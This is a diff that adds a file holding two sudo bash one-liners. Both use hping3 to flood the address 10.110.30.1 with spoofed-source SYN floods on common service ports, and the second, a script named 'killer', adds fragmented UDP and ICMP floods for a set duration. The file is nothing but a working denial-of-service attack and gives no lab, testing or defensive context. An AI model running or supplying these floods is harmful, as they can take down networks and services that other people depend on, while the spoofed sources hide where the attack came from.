@@ -1,0 +1,8 @@
+sudo bash -c 'T=10.110.30.1; for p in 443 80 53 22 445; do hping3 -S --flood --rand-source -p "$p" "$T" >/dev/null 2>&1 & done; for p in 67 68 53 123; do hping3 --udp --flood --rand-source -p "$p" "$T" >/dev/null 2>&1 & done; wait’
+
+
+
+
+
+
+sudo bash -c 'set -u; T=${1:?usage: killer <target> [secs] [iface]}; DUR=${2:-60}; IFACE=${3:-}; CPIDS=(); cleanup(){ for p in "${CPIDS[@]}"; do kill -9 "$p" 2>/dev/null:; done; wait 2>/dev/null:; }; trap cleanup EXIT INT TERM; if [ -n "$IFACE" ]; then I=(-I "$IFACE"); else I=(); fi; echo "[*] flooding $T for ${DUR}s"; for p in 443 80 8080 53 22 445 3389; do hping3 -S --flood --rand-source -d 0 -p "$p" "${I[@]}" "$T" >/dev/null 2>&1 & CPIDS+=($!); done; for p in 53 123 67 68 1900; do hping3 --udp --flood --rand-source --frag -d 1000 -p "$p" "${I[@]}" "$T" >/dev/null 2>&1 & CPIDS+=($!); done; hping3 -1 --flood --rand-source -d 1000 "${I[@]}" "$T" >/dev/null 2>&1 & CPIDS+=($!); sleep "$DUR"; cleanup; echo "[*] stopped"' _ 10.110.30.1 60 eth0
